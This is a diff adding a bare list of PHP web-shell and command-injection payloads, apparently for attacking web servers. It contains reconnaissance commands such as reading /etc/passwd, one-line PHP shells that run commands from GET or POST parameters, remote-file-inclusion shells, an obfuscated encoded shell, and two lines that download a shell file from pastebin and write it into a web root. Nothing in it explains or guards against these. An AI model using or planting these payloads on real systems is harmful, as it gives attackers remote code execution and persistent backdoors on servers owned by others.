@@ -1,0 +1,18 @@
+ls
+id
+uname
+whoami
+which python
+cat /etc/passwd
+<?=phpinfo();?>
+<?php passthru('whoami'); ?>
+echo 'Enter Your Text' > text.txt
+<?php system($_GET['cmd']);?>
+<?php system($_POST['cmd']);?>
+wget https://pastebin.com/raw/N0eh3Q7Y -O shell.php
+echo "<?php include($_GET['cmd']) ?>" > rfi.php
+echo "<?php include($_POST['cmd']) ?>" > rfi.php
+<?php system('ls');?>
+<?=`{${~"\xa0\xb8\xba\xab"\}\["\xa0"]}`;
+<?php echo '<pre>';@extract ($_GET);@die ($ctime($atime));?>
+@fwrite(fopen('/var/www/public_html/shell.php','w'),file_get_contents('https://pastebin.com/raw/YwhJXPnE'))
